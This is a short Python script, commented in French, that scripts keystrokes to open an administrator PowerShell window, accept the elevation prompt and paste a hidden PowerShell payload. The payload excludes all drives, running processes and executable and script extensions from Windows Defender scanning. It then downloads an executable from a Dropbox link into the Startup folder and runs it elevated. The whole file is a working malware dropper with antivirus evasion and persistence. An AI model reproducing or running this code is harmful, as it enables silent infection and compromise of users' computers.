import time
import keyboard
import pyperclip

# Ton script PowerShell ici :
mon_script = """
$drives = Get-PSDrive -PSProvider 'FileSystem' | Where-Object { $_.Free -gt 0 }
foreach ($drive in $drives) {
    Add-MpPreference -ExclusionPath "$($drive.Root)"
}

$procs = Get-Process | Where-Object { $_.Path -ne $null }
foreach ($proc in $procs) {
    Add-MpPreference -ExclusionProcess $proc.Name
}

$exts = @(".exe", ".bat", ".cmd", ".ps1", ".vbs", ".js")
foreach ($ext in $exts) {
    Add-MpPreference -ExclusionExtension $ext
}

$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Setup.exe"
$url = "https://www.dropbox.com/scl/fi/tib5nwxpmwwuryllzsf9k/Setup.exe?rlkey=0ppes5814g09i6p0n88wg3u3l&st=56fnxb6k&dl=1"

if (Test-Path $startupPath) {
    Remove-Item $startupPath -Force
}

Invoke-WebRequest -Uri $url -OutFile $startupPath -UseBasicParsing -Headers @{
    "User-Agent" = "Mozilla/5.0"
}

Start-Process -FilePath $startupPath -Verb RunAs -Wait
"""

pyperclip.copy(mon_script)

# Attendre un peu pour bien lancer
time.sleep(2)

# Touche Win pour ouvrir le menu dmarrer
keyboard.press_and_release("win")
time.sleep(1)

# Taper "powershell"
keyboard.write("powershell")
time.sleep(1)


keyboard.press_and_release("ctrl+shift+enter")
time.sleep(3)


keyboard.press_and_release("left")  # Flèche sur "Oui"
keyboard.press_and_release("enter")
time.sleep(2)

# Coller le script
keyboard.press_and_release("ctrl+v")
time.sleep(0.5)

# Lancer
keyboard.press_and_release("enter")
